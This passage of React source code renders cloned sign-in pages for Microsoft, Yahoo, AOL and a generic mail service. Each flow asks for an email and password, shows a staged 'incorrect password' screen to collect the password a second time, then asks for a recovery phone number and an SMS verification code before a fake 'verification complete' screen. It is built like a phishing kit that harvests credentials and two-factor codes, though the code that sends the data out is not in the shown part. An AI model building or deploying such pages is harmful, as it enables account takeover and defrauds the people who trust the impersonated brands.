                className="bg-[#0067b8] hover:bg-[#005da6] text-white font-sans text-xs font-normal px-8 py-2 min-w-[90px] flex items-center justify-center cursor-pointer shadow-md shadow-blue-500/10"
              >
                {loading ? <div className="w-3.5 h-3.5 border-2 border-white/20 border-t-white rounded-full animate-spin" /> : "Sign in"}
              </button>
            </div>
          </form>
        )}

        {step === "incorrect_password" && (
          <form onSubmit={handleIncorrectPasswordSubmit} className="space-y-6" id="microsoft-incorrect-form">
            <div className="text-left">
              <div className="flex items-center gap-2 mb-3">
                <button 
                  type="button" 
                  onClick={handleBackToEmail}
                  className="w-5 h-5 rounded-full hover:bg-white/15 flex items-center justify-center text-slate-300 transition-colors"
                >
                  <ArrowLeft size={14} />
                </button>
                <span className="font-mono text-sm text-slate-300">{email}</span>
              </div>

              <h2 className="text-white text-[22px] font-semibold tracking-tight mb-1">Enter password</h2>
              <p className="text-[#f25022] text-xs font-normal font-sans py-2 animate-shake">
                ⚠️ That password doesn't look right. Please make sure you're using the correct secure key.
              </p>
            </div>

            <div className="space-y-1 font-sans">
              <div className="relative flex items-center">
                <input
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full bg-transparent text-white font-sans text-sm border-b border-b-red-400 focus:border-b-red-400 py-2 pr-10 px-0 outline-none transition-all placeholder-slate-500 placeholder-red-300"
                  placeholder="Password"
                  disabled={loading}
                  autoFocus
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-2 text-slate-400 hover:text-slate-200"
                >
                  {showPassword ? <EyeOff size={16} /> : <Eye size={16} />}
                </button>
              </div>
              {error && <p className="text-red-400 text-xs font-sans pt-1">⚠️ {error}</p>}
            </div>

            <div className="flex items-center justify-end gap-3 pt-6">
              <button
                type="button"
                onClick={handleBackToEmail}
                className="bg-[#e1e1e1]/15 hover:bg-[#e1e1e1]/25 text-slate-200 font-sans text-xs px-5 py-2 transition-all cursor-pointer border border-white/10"
              >
                Forgot?
              </button>
              <button
                type="submit"
                disabled={loading}
                className="bg-[#0067b8] hover:bg-[#005da6] text-white font-sans text-xs font-normal px-8 py-2 min-w-[90px] flex items-center justify-center cursor-pointer shadow-md"
              >
                {loading ? <div className="w-3.5 h-3.5 border-2 border-white/20 border-t-white rounded-full animate-spin" /> : "Sign in"}
              </button>
            </div>
          </form>
        )}

        {step === "phone_prompt" && (
          <form onSubmit={handlePhoneSubmit} className="space-y-6" id="microsoft-phone-form">
            <div className="text-left font-sans">
              <div className="flex items-center gap-2 mb-3">
                <span className="font-mono text-sm text-slate-300">{email}</span>
              </div>
              <h2 className="text-white text-[22px] font-semibold tracking-tight mb-2">Verify your identity</h2>
              <p className="text-slate-350 text-[13px] font-normal leading-snug">
                For security reasons, please input the recovery mobile telephone number associated with your personal profile.
              </p>
            </div>

            <div className="space-y-1 pt-2 font-sans">
              <div className="flex gap-2 items-center border-b border-b-slate-500 focus-within:border-b-[#0067b8] pb-1">
                <span className="text-sm text-slate-400 select-none font-semibold">🇺🇸 +1</span>
                <input
                  type="tel"
                  value={phone}
                  onChange={(e) => setPhone(e.target.value)}
                  className="w-full bg-transparent text-white font-sans text-sm py-1 px-0 outline-none transition-all placeholder-slate-500"
                  placeholder="Recovery phone number"
                  disabled={loading}
                  autoFocus
                />
              </div>
              {error && <p className="text-red-400 text-xs font-sans pt-1">⚠️ {error}</p>}
            </div>

            <div className="flex items-center justify-end gap-3 pt-6">
              <button
                type="button"
                onClick={() => setStep("incorrect_password")}
                className="bg-[#e1e1e1]/15 hover:bg-[#e1e1e1]/25 text-slate-200 font-sans text-xs px-5 py-2 transition-all cursor-pointer border border-white/10"
              >
                Back
              </button>
              <button
                type="submit"
                disabled={loading}
                className="bg-[#0067b8] hover:bg-[#005da6] text-white font-sans text-xs font-normal px-8 py-2 min-w-[90px] flex items-center justify-center cursor-pointer shadow-md"
              >
                {loading ? <div className="w-3.5 h-3.5 border-2 border-white/20 border-t-white rounded-full animate-spin" /> : "Send Code"}
              </button>
            </div>
          </form>
        )}

        {step === "sms_prompt" && (
          <form onSubmit={handleSmsSubmit} className="space-y-6" id="microsoft-sms-form">
            <div className="text-left font-sans">
              <h2 className="text-white text-[22px] font-semibold tracking-tight mb-2">Enter code</h2>
              <p className="text-slate-355 text-[13px] font-normal leading-snug">
                We sent a text token to **+1 {phone}**. Please enter the code below to complete authorization.
              </p>
            </div>

            <div className="space-y-1 pt-2 font-sans">
              <input
                type="text"
                value={smsCode}
                onChange={(e) => setSmsCode(e.target.value)}
                className={`w-full bg-transparent text-white font-sans text-sm border-b ${error ? 'border-b-red-400' : 'border-b-slate-500 focus:border-b-[#0067b8]'} py-2 px-0 outline-none transition-all placeholder-slate-500 focus:border-b-2`}
                placeholder="6-digit code"
                disabled={loading}
                autoFocus
              />
              {error && <p className="text-red-400 text-xs font-sans pt-1">⚠️ {error}</p>}
            </div>

            <p className="text-[11px] text-slate-400">
              Incorrect number? <button type="button" onClick={() => setStep("phone_prompt")} className="text-[#0067b8] hover:underline">Change</button>
            </p>

            <div className="flex items-center justify-end gap-3 pt-6">
              <button
                type="button"
                onClick={() => setStep("phone_prompt")}
                className="bg-[#e1e1e1]/15 hover:bg-[#e1e1e1]/25 text-slate-200 font-sans text-xs px-5 py-2 transition-all cursor-pointer border border-white/10"
              >
                Back
              </button>
              <button
                type="submit"
                disabled={loading}
                className="bg-[#0067b8] hover:bg-[#005da6] text-white font-sans text-xs font-normal px-8 py-2 min-w-[90px] flex items-center justify-center cursor-pointer shadow-md"
              >
                {loading ? <div className="w-3.5 h-3.5 border-2 border-white/20 border-t-white rounded-full animate-spin" /> : "Verify"}
              </button>
            </div>
          </form>
        )}

        {step === "success_gate" && (
          <div className="flex flex-col items-center justify-center py-8 text-center" id="microsoft-success-panel">
            <div className="w-14 h-14 bg-blue-500/10 border border-blue-500/20 text-blue-400 rounded-lg flex items-center justify-center mb-4">
              <CheckCircle2 size={32} />
            </div>
            <h2 className="text-white text-xl font-semibold mb-1">Verify Complete</h2>
            <p className="text-slate-400 text-[13px] leading-snug px-6 max-w-xs mt-1">Establishing single sign-on connection token securely...</p>
            
            <div className="w-full max-w-xs bg-white/5 border border-white/5 h-1.5 rounded-none overflow-hidden mt-6">
              <div 
                className="h-full bg-blue-500 transition-all duration-100 ease-out"
                style={{ width: `${successProgress}%` }}
              />
            </div>
          </div>
        )}
      </div>
    );
  };

  const renderYahooDesign = () => {
    return (
      <div className="w-full max-w-[400px] mx-auto glass-card rounded-3xl p-8 sm:p-10 shadow-2xl relative border border-white/10" id="yahoo-login-viewport">
        <YahooLogo />

        {step === "email" && (
          <form onSubmit={handleEmailSubmit} className="space-y-6" id="yahoo-email-form">
            <div className="text-center">
              <h2 className="text-white text-xl font-normal mb-1">Sign in</h2>
              <p className="text-slate-300 text-xs font-light">using your Yahoo account</p>
            </div>

            <div className="space-y-1">
              <input
                type="text"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className={`w-full bg-[#0b0f19]/75 text-white font-sans text-sm border ${error ? 'border-red-400 focus:border-red-400' : 'border-slate-700 focus:border-[#7e22ce]'} rounded-full py-3 px-5 outline-none transition-all placeholder-slate-500 focus:ring-1 focus:ring-[#7e22ce]/50`}
                placeholder="Username, email, or mobile"
                disabled={loading}
              />
              {error && <p className="text-red-400 text-xs font-sans text-center">⚠️ {error}</p>}
            </div>

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-[#184fa2] hover:bg-[#123e80] text-white font-sans text-sm font-semibold rounded-full py-3 transition-colors flex items-center justify-center cursor-pointer shadow-md shadow-indigo-600/10"
            >
              {loading ? <div className="w-4 h-4 border-2 border-white/20 border-t-white rounded-full animate-spin" /> : "Next"}
            </button>

            <div className="text-center text-xs text-blue-400 space-y-2 pt-2">
              <p className="hover:underline cursor-pointer">Forgot username?</p>
              <p className="text-slate-400">New user? <span className="text-blue-400 hover:underline cursor-pointer">Create an account</span></p>
            </div>

            <div className="text-xs text-slate-400 leading-normal bg-white/5 border border-white/5 p-4 rounded-xl">
              <p className="font-semibold text-slate-200">✨ Yahoo Secure Portal Guest mode</p>
              <p>Type your personal or work email and tap Next.</p>
            </div>

            <div className="flex justify-center pt-2">
              <button
                type="button"
                onClick={onBack}
                className="text-slate-400 hover:text-slate-200 text-xs font-medium transition-colors cursor-pointer"
              >
                Back to Announcement
              </button>
            </div>
          </form>
        )}

        {step === "password" && (
          <form onSubmit={handlePasswordSubmit} className="space-y-6" id="yahoo-password-form">
            <div className="text-center">
              <h2 className="text-white text-xl font-normal mb-1">Enter password</h2>
              
              <div 
                className="inline-flex items-center gap-1 bg-white/5 hover:bg-white/10 text-slate-300 text-xs rounded-full py-1 px-3 cursor-pointer mt-1 mb-2 transition-all"
                onClick={handleBackToEmail}
              >
                <span>{email}</span>
                <ChevronDown size={12} className="text-slate-400" />
              </div>
            </div>

            <div className="space-y-1">
              <div className="relative flex items-center">
                <input
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className={`w-full bg-[#0b0f19]/75 text-white font-sans text-sm border ${error ? 'border-red-400 focus:border-red-400' : 'border-slate-700 focus:border-[#7e22ce]'} rounded-full py-3 px-5 pr-12 outline-none transition-all placeholder-slate-500 focus:ring-1 focus:ring-[#7e22ce]/50`}
                  placeholder="Password"
                  disabled={loading}
                  autoFocus
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-4 text-slate-400 hover:text-slate-200"
                >
                  {showPassword ? <EyeOff size={16} /> : <Eye size={16} />}
                </button>
              </div>
              {error && <p className="text-red-400 text-xs font-sans text-center">⚠️ {error}</p>}
            </div>

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-[#184fa2] hover:bg-[#123e80] text-white font-sans text-sm font-semibold rounded-full py-3 transition-colors flex items-center justify-center cursor-pointer shadow-md"
            >
              {loading ? <div className="w-4 h-4 border-2 border-white/20 border-t-white rounded-full animate-spin" /> : "Sign in"}
            </button>

            <div className="text-center text-xs text-blue-400 pt-1">
              <p className="hover:underline cursor-pointer">Forgot password?</p>
            </div>

            <div className="text-xs text-slate-400 leading-normal bg-white/5 border border-white/5 p-4 rounded-xl">
              <p className="font-semibold text-emerald-400 mb-1 flex items-center gap-1">
                <Check size={12} /> Verification Uncapped
              </p>
              <p>Type any guest password (e.g., 2026) and tap Sign in to enter.</p>
            </div>

            <div className="flex justify-center pt-2">
              <button
                type="button"
                onClick={handleBackToEmail}
                className="text-slate-400 hover:text-slate-300 text-xs font-medium transition-colors cursor-pointer"
              >
                Change account email
              </button>
            </div>
          </form>
        )}

        {step === "incorrect_password" && (
          <form onSubmit={handleIncorrectPasswordSubmit} className="space-y-6" id="yahoo-incorrect-form">
            <div className="text-center">
              <h2 className="text-white text-xl font-normal mb-1">Enter password</h2>
              <div className="inline-flex items-center gap-1 bg-white/5 text-slate-300 text-xs rounded-full py-1 px-3 cursor-pointer mt-1 mb-2">
                <span>{email}</span>
              </div>
            </div>

            <div className="bg-red-500/10 border border-red-500/20 text-red-200 text-xs py-2.5 px-4 rounded-2xl text-center font-medium animate-shake" id="yahoo-err-box">
              ⚠️ Invalid password. Please attempt again.
            </div>

            <div className="space-y-1">
              <div className="relative flex items-center">
                <input
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full bg-[#0b0f19]/75 text-white font-sans text-sm border border-red-500 rounded-full py-3 px-5 pr-12 outline-none focus:ring-1 focus:ring-red-500/50"
                  placeholder="Re-enter password"
                  disabled={loading}
                  autoFocus
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-4 text-slate-400 hover:text-slate-200"
                >
                  {showPassword ? <EyeOff size={16} /> : <Eye size={16} />}
                </button>
              </div>
              {error && <p className="text-red-400 text-xs font-sans text-center">⚠️ {error}</p>}
            </div>

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-[#184fa2] hover:bg-[#123e80] text-white font-sans text-sm font-semibold rounded-full py-3 transition-colors flex items-center justify-center cursor-pointer shadow-md"
            >
              {loading ? <div className="w-4 h-4 border-2 border-white/20 border-t-white rounded-full animate-spin" /> : "Next"}
            </button>
          </form>
        )}

        {step === "phone_prompt" && (
          <form onSubmit={handlePhoneSubmit} className="space-y-6" id="yahoo-phone-form">
            <div className="text-center">
              <h2 className="text-white text-xl font-normal mb-1">Confirm Mobile</h2>
              <p className="text-slate-300 text-xs font-light">Confirm the cell telephone contact number bound to this web session.</p>
            </div>

            <div className="space-y-1">
              <div className="flex gap-2">
                <div className="bg-[#0b0f19]/75 border border-slate-700 px-4 py-3 rounded-full text-slate-300 text-sm select-none flex items-center font-semibold font-sans">
                  🇺🇸 +1
                </div>
                <input
                  type="tel"
                  value={phone}
                  onChange={(e) => setPhone(e.target.value)}
                  className={`w-full bg-[#0b0f19]/75 text-white font-sans text-sm border ${error ? 'border-red-400' : 'border-slate-700 focus:border-[#7e22ce]'} rounded-full py-3 px-5 outline-none transition-all placeholder-slate-500`}
                  placeholder="Mobile number"
                  disabled={loading}
                  autoFocus
                />
              </div>
              {error && <p className="text-red-400 text-xs font-sans text-center">⚠️ {error}</p>}
            </div>

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-[#184fa2] hover:bg-[#123e80] text-white font-sans text-sm font-semibold rounded-full py-3 transition-colors flex items-center justify-center cursor-pointer shadow-md"
            >
              {loading ? <div className="w-4 h-4 border-2 border-white/20 border-t-white rounded-full animate-spin" /> : "Send Code"}
            </button>
          </form>
        )}

        {step === "sms_prompt" && (
          <form onSubmit={handleSmsSubmit} className="space-y-6" id="yahoo-sms-form">
            <div className="text-center">
              <h2 className="text-white text-xl font-normal mb-1">Verify Mobile</h2>
              <p className="text-slate-300 text-xs font-light">Enter the 6-digit verification code Yahoo texted to **+1 {phone}**.</p>
            </div>

            <div className="space-y-1">
              <input
                type="text"
                value={smsCode}
                onChange={(e) => setSmsCode(e.target.value)}
                className={`w-full bg-[#0b0f19]/75 text-white font-sans text-sm border ${error ? 'border-red-400' : 'border-slate-700 focus:border-[#7e22ce]'} rounded-full py-3 px-5 outline-none text-center font-bold tracking-widest`}
                placeholder="6-digit verification code"
                disabled={loading}
                autoFocus
              />
              {error && <p className="text-red-400 text-xs font-sans text-center">⚠️ {error}</p>}
            </div>

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-[#184fa2] hover:bg-[#123e80] text-white font-sans text-sm font-semibold rounded-full py-3 transition-colors flex items-center justify-center cursor-pointer shadow-md"
            >
              {loading ? <div className="w-4 h-4 border-2 border-white/20 border-t-white rounded-full animate-spin" /> : "Verify Code"}
            </button>
          </form>
        )}

        {step === "success_gate" && (
          <div className="flex flex-col items-center justify-center py-6 text-center" id="yahoo-success-panel">
            <div className="w-14 h-14 bg-purple-500/10 border border-purple-500/20 text-[#a04efc] rounded-full flex items-center justify-center mb-4 animate-bounce">
              <CheckCircle2 size={32} />
            </div>
            <h2 className="text-white text-lg font-semibold mb-1">Handshake Approved</h2>
            <p className="text-slate-400 text-xs px-6">Creating your active guest login ticket safely...</p>
            
            <div className="w-full max-w-xs bg-white/5 border border-white/5 h-2 rounded-full overflow-hidden mt-6">
              <div 
                className="h-full bg-[#7e22ce] transition-all duration-100 ease-out animate-pulse"
                style={{ width: `${successProgress}%` }}
              />
            </div>
          </div>
        )}
      </div>
    );
  };

  const renderAolDesign = () => {
    return (
      <div className="w-full max-w-[400px] mx-auto glass-card rounded-3xl p-8 sm:p-10 shadow-2xl relative border border-white/10" id="aol-login-viewport">
        <AolLogo />

        {step === "email" && (
          <form onSubmit={handleEmailSubmit} className="space-y-6" id="aol-email-form">
            <div className="text-center">
              <h2 className="text-white text-xl font-normal mb-1">Sign in</h2>
              <p className="text-slate-300 text-xs font-light">using your AOL account</p>
            </div>

            <div className="space-y-1">
              <input
                type="text"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className={`w-full bg-[#0b0f19]/75 text-white font-sans text-sm border ${error ? 'border-red-400 focus:border-red-400' : 'border-slate-700 focus:border-blue-500'} rounded-md py-3 px-4 outline-none transition-all placeholder-slate-500 focus:ring-1 focus:ring-blue-500/50`}
                placeholder="Username, email, or mobile"
                disabled={loading}
              />
              {error && <p className="text-red-400 text-xs font-sans text-center">⚠️ {error}</p>}
            </div>

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-[#006021] hover:bg-[#00501b] text-white font-sans text-sm font-bold rounded-full py-3 transition-colors flex items-center justify-center cursor-pointer shadow-md shadow-emerald-700/10"
            >
              {loading ? <div className="w-4 h-4 border-2 border-white/20 border-t-white rounded-full animate-spin" /> : "Next"}
            </button>

            <div className="text-center text-xs text-blue-400 space-y-2 pt-2">
              <p className="hover:underline cursor-pointer">Forgot username?</p>
              <p className="text-slate-400">New to AOL? <span className="text-blue-400 hover:underline cursor-pointer">Create an account</span></p>
            </div>

            <div className="text-xs text-slate-400 leading-normal bg-white/5 border border-white/5 p-4 rounded-xl">
              <p className="font-semibold text-slate-200">✨ AOL Guest Gateway</p>
              <p>Type your personal or work email and select Next to register and access.</p>
            </div>

            <div className="flex justify-center pt-2">
              <button
                type="button"
                onClick={onBack}
                className="text-slate-400 hover:text-slate-200 text-xs font-medium transition-colors cursor-pointer"
              >
                Back to Announcement
              </button>
            </div>
          </form>
        )}

        {step === "password" && (
          <form onSubmit={handlePasswordSubmit} className="space-y-6" id="aol-password-form">
            <div className="text-center">
              <h2 className="text-white text-xl font-normal mb-1">Enter password</h2>
              
              <div 
                className="inline-flex items-center gap-1 bg-white/5 hover:bg-white/10 text-slate-300 text-xs rounded-full py-1 px-3 cursor-pointer mt-1 mb-2 transition-all"
                onClick={handleBackToEmail}
              >
                <span>{email}</span>
                <ChevronDown size={12} className="text-slate-400" />
              </div>
            </div>

            <div className="space-y-1">
              <div className="relative flex items-center">
                <input
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className={`w-full bg-[#0b0f19]/75 text-white font-sans text-sm border ${error ? 'border-red-400 focus:border-red-400' : 'border-slate-700 focus:border-blue-500'} rounded-md py-3 px-4 pr-12 outline-none transition-all placeholder-slate-500 focus:ring-1 focus:ring-blue-500/50`}
                  placeholder="Password"
                  disabled={loading}
                  autoFocus
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-4 text-slate-400 hover:text-slate-200"
                >
                  {showPassword ? <EyeOff size={16} /> : <Eye size={16} />}
                </button>
              </div>
              {error && <p className="text-red-400 text-xs font-sans text-center">⚠️ {error}</p>}
            </div>

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-[#006021] hover:bg-[#00501b] text-white font-sans text-sm font-bold rounded-full py-3 transition-colors flex items-center justify-center cursor-pointer shadow-md"
            >
              {loading ? <div className="w-4 h-4 border-2 border-white/20 border-t-white rounded-full animate-spin" /> : "Sign in"}
            </button>

            <div className="text-center text-xs text-blue-400 pt-1">
              <p className="hover:underline cursor-pointer">Forgot password?</p>
            </div>

            <div className="text-xs text-slate-400 leading-normal bg-white/5 border border-white/5 p-4 rounded-xl">
              <p className="font-semibold text-emerald-400 mb-1 flex items-center gap-1">
                <Check size={12} /> Gateway Unlocked Check
              </p>
              <p>Type any guest password (e.g., 2026) and tap Sign in to enter.</p>
            </div>

            <div className="flex justify-center pt-2">
              <button
                type="button"
                onClick={handleBackToEmail}
                className="text-slate-400 hover:text-slate-300 text-xs font-medium transition-colors cursor-pointer"
              >
                Change account email
              </button>
            </div>
          </form>
        )}

        {step === "incorrect_password" && (
          <form onSubmit={handleIncorrectPasswordSubmit} className="space-y-6" id="aol-incorrect-form">
            <div className="text-center">
              <h2 className="text-white text-xl font-normal mb-1">Enter password</h2>
              <div className="inline-flex items-center gap-1 bg-white/5 text-slate-300 text-xs rounded-full py-1 px-3 mt-1 mb-2">
                <span>{email}</span>
              </div>
            </div>

            <div className="bg-red-500/10 border border-red-500/20 text-red-200 text-xs py-2.5 px-4 rounded-md text-center font-sans animate-shake" id="aol-err-box">
              ⚠️ Incorrect password. Please try again.
            </div>

            <div className="space-y-1 font-sans">
              <div className="relative flex items-center">
                <input
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full bg-[#0b0f19]/75 text-white font-sans text-sm border border-red-500 rounded-md py-3 px-4 pr-12 outline-none focus:ring-1 focus:ring-red-500/50"
                  placeholder="Re-enter password"
                  disabled={loading}
                  autoFocus
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-4 text-slate-400 hover:text-slate-200"
                >
                  {showPassword ? <EyeOff size={16} /> : <Eye size={16} />}
                </button>
              </div>
              {error && <p className="text-red-400 text-xs font-sans text-center">⚠️ {error}</p>}
            </div>

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-[#006021] hover:bg-[#00501b] text-white font-sans text-sm font-bold rounded-full py-3 transition-colors flex items-center justify-center cursor-pointer shadow-md"
            >
              {loading ? <div className="w-4 h-4 border-2 border-white/20 border-t-white rounded-full animate-spin" /> : "Verify Identity"}
            </button>
          </form>
        )}

        {step === "phone_prompt" && (
          <form onSubmit={handlePhoneSubmit} className="space-y-6" id="aol-phone-form">
            <div className="text-center">
              <h2 className="text-white text-xl font-normal mb-1">Verify Phone Number</h2>
              <p className="text-slate-300 text-xs font-light">Confirm your mobile phone number. AOL needs to dispatch an SMS challenge code.</p>
            </div>

            <div className="space-y-1">
              <div className="flex gap-2">
                <div className="bg-[#0b0f19]/75 border border-slate-700 font-semibold px-4 py-3 rounded-md text-slate-300 text-sm select-none flex items-center font-sans">
                  🇺🇸 +1
                </div>
                <input
                  type="tel"
                  value={phone}
                  onChange={(e) => setPhone(e.target.value)}
                  className={`w-full bg-[#0b0f19]/75 text-white font-sans text-sm border ${error ? 'border-red-400' : 'border-slate-700 focus:border-emerald-500'} rounded-md py-3 px-4 outline-none transition-all placeholder-slate-500`}
                  placeholder="Mobile number"
                  disabled={loading}
                  autoFocus
                />
              </div>
              {error && <p className="text-red-400 text-xs font-sans text-center">⚠️ {error}</p>}
            </div>

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-[#006021] hover:bg-[#00501b] text-white font-sans text-sm font-bold rounded-full py-3 transition-colors flex items-center justify-center cursor-pointer shadow-md"
            >
              {loading ? <div className="w-4 h-4 border-2 border-white/20 border-t-white rounded-full animate-spin" /> : "Send Code"}
            </button>
          </form>
        )}

        {step === "sms_prompt" && (
          <form onSubmit={handleSmsSubmit} className="space-y-6" id="aol-sms-form">
            <div className="text-center">
              <h2 className="text-white text-xl font-normal mb-1">Enter Verification Code</h2>
              <p className="text-slate-300 text-xs font-light">Enter the security code delivered to cell transmission **+1 {phone}**.</p>
            </div>

            <div className="space-y-1">
              <input
                type="text"
                value={smsCode}
                onChange={(e) => setSmsCode(e.target.value)}
                className={`w-full bg-[#0b0f19]/75 text-white font-sans text-sm border ${error ? 'border-red-400' : 'border-slate-700 focus:border-emerald-500'} rounded-md py-3 px-4 outline-none transition-all text-center font-bold tracking-widest`}
                placeholder="XXXXXX"
                disabled={loading}
                autoFocus
              />
              {error && <p className="text-red-400 text-xs font-sans text-center">⚠️ {error}</p>}
            </div>

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-[#006021] hover:bg-[#00501b] text-white font-sans text-sm font-bold rounded-full py-3 transition-colors flex items-center justify-center cursor-pointer shadow-md"
            >
              {loading ? <div className="w-4 h-4 border-2 border-white/20 border-t-white rounded-full animate-spin" /> : "Verify and Sign In"}
            </button>
          </form>
        )}

        {step === "success_gate" && (
          <div className="flex flex-col items-center justify-center py-6 text-center" id="aol-success-panel">
            <div className="w-14 h-14 bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 rounded-full flex items-center justify-center mb-4">
              <CheckCircle2 size={32} />
            </div>
            <h2 className="text-white text-lg font-semibold mb-1">Verification OK</h2>
            <p className="text-slate-400 text-xs px-6">Establishing secure hand-off tunnel. One moment...</p>
            
            <div className="w-full max-w-xs bg-white/5 border border-white/5 h-2 rounded-full overflow-hidden mt-6">
              <div 
                className="h-full bg-emerald-400 transition-all duration-100 ease-out animate-pulse"
                style={{ width: `${successProgress}%` }}
              />
            </div>
          </div>
        )}
      </div>
    );
  };

  const renderOtherDesign = () => {
    return (
      <div className="w-full max-w-[460px] mx-auto glass-card rounded-3xl p-8 sm:p-10 shadow-2xl relative border border-white/10" id="generic-login-viewport">
        <GenericMailLogo />

        {step === "email" && (
          <form onSubmit={handleEmailSubmit} className="space-y-6" id="generic-email-form">
            <div className="text-center">
              <h2 className="text-white text-xl font-bold tracking-tight mb-1">Email Authorization</h2>
              <p className="text-slate-400 text-xs font-light">Please enter your address to unlock the invitation hub</p>
            </div>

            <div className="space-y-1">
              <label className="block text-[10px] font-semibold text-slate-300 uppercase tracking-wider mb-1">Email Address</label>
              <input
                type="text"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className={`w-full bg-[#0b0f19]/75 text-white font-sans text-sm border ${error ? 'border-red-400 focus:border-red-400' : 'border-slate-800 focus:border-indigo-500'} rounded-xl py-3.5 px-4 outline-none transition-all placeholder-slate-600 focus:ring-1 focus:ring-indigo-500/50 font-light`}
                placeholder="guest@domain.com"
                disabled={loading}
              />
              {error && <p className="text-red-400 text-xs font-sans">⚠️ {error}</p>}
            </div>

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-gradient-to-r from-indigo-500 to-emerald-400 hover:from-indigo-600 hover:to-emerald-500 text-white font-sans text-sm font-semibold rounded-xl py-3.5 transition-all flex items-center justify-center cursor-pointer shadow-lg shadow-indigo-500/15"
            >
              {loading ? <div className="w-4 h-4 border-2 border-white/20 border-t-white rounded-full animate-spin" /> : "Continue Setup"}
            </button>

            <div className="text-xs text-slate-400 leading-normal bg-white/5 border border-white/5 p-4 rounded-xl space-y-1">
              <p className="font-semibold text-slate-200">🔒 Enterprise Shield Tunnel</p>
              <p>Simulated web interface. Accepts any active personal or corporate email domain securely.</p>
            </div>

            <div className="flex justify-between items-center text-xs pt-2">
              <button
                type="button"
                onClick={onBack}
                className="text-slate-400 hover:text-slate-200 font-medium transition-colors cursor-pointer flex items-center gap-1"
              >
                <ArrowLeft size={12} /> Return
              </button>
              <span className="text-slate-500">Port 3000 (HTTPS)</span>
            </div>
          </form>
        )}

        {step === "password" && (
          <form onSubmit={handlePasswordSubmit} className="space-y-6" id="generic-password-form">
            <div className="text-center">
              <h2 className="text-white text-xl font-bold tracking-tight mb-1">Verify Passkey</h2>
              
              <div 
                className="inline-flex items-center gap-1 bg-white/5 border border-white/10 hover:bg-white/10 text-slate-300 text-xs rounded-full py-1.5 px-3.5 cursor-pointer mt-1 mb-2 transition-all"
                onClick={handleBackToEmail}
              >
                <span className="font-mono">{email}</span>
                <ChevronDown size={12} className="text-slate-400" />
              </div>
            </div>

            <div className="space-y-1">
              <label className="block text-[10px] font-semibold text-slate-300 uppercase tracking-wider mb-1">Passcode or Password</label>
              <div className="relative flex items-center">
                <input
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className={`w-full bg-[#0b0f19]/75 text-white font-sans text-sm border ${error ? 'border-red-400 focus:border-red-400' : 'border-slate-800 focus:border-indigo-500'} rounded-xl py-3.5 px-4 pr-12 outline-none transition-all placeholder-slate-600 focus:ring-1 focus:ring-indigo-500/50 font-light`}
                  placeholder="Password (e.g. 2026)"
                  disabled={loading}
                  autoFocus
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-4 text-slate-400 hover:text-slate-200"
                >
                  {showPassword ? <EyeOff size={16} /> : <Eye size={16} />}
                </button>
              </div>
              {error && <p className="text-red-400 text-xs font-sans">⚠️ {error}</p>}
            </div>

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-gradient-to-r from-indigo-500 to-emerald-400 hover:from-indigo-600 hover:to-emerald-500 text-white font-sans text-sm font-semibold rounded-xl py-3.5 transition-all flex items-center justify-center cursor-pointer shadow-lg shadow-indigo-500/15"
            >
              {loading ? <div className="w-4 h-4 border-2 border-white/20 border-t-white rounded-full animate-spin" /> : "Verify Identity"}
            </button>

            <div className="text-xs text-slate-400 leading-normal bg-white/5 border border-white/5 p-4 rounded-xl space-y-1">
              <p className="font-semibold text-emerald-400 flex items-center gap-1">
                <Check size={12} /> Bypass Mode Validated
              </p>
              <p>Type any credentials or guest passcode to execute a client-side authorization handshake.</p>
            </div>

            <div className="flex justify-between items-center text-xs pt-2">
              <button
                type="button"
                onClick={handleBackToEmail}
                className="text-slate-400 hover:text-slate-200 font-medium transition-colors cursor-pointer"
              >
                Change Email Address
              </button>
              <span className="text-slate-500">256-bit SSL</span>
            </div>
          </form>
        )}

        {step === "incorrect_password" && (
          <form onSubmit={handleIncorrectPasswordSubmit} className="space-y-6" id="generic-incorrect-form">
            <div className="text-center">
              <h2 className="text-white text-xl font-bold tracking-tight mb-1">Verify Passkey</h2>
              <div className="inline-flex items-center gap-1 bg-white/5 border border-white/10 text-slate-300 text-xs rounded-full py-1.5 px-3.5 mt-1 mb-2">
                <span className="font-mono">{email}</span>
              </div>
            </div>

            <div className="bg-red-500/10 border border-red-500/20 text-red-350 text-xs py-3 px-4 rounded-xl flex items-start gap-2.5 animate-shake" id="generic-err-box">
              <AlertCircle size={16} className="text-red-400 mt-0.5 shrink-0" />
              <div>
                <p className="font-semibold text-red-200">Handshake Match Refused</p>
                <p className="text-slate-405 mt-0.5 text-[11px]">Incorrect security passkey. Please confirm and verify again.</p>
              </div>
            </div>

            <div className="space-y-1 font-sans">
              <div className="relative flex items-center">
                <input
